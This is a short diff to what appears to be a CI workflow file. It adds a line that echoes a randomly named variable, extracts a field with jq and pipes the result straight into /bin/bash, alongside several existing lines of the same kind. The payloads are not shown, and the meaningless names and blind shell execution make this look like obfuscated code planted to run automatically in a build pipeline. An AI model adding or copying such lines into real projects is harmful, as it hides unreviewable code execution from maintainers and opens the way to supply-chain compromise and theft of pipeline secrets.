@@ -22,6 +22,7 @@ jobs:
           echo $bnshi2 | jq -r .ofdsg34 | /bin/bash
           echo $rcycp1029 | jq -r .bu50973 | /bin/bash
           printf '%s' "$aphp5" | jq -r .pl48 | /bin/bash
+          echo $kiwdg498 | jq -r .cd6535 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
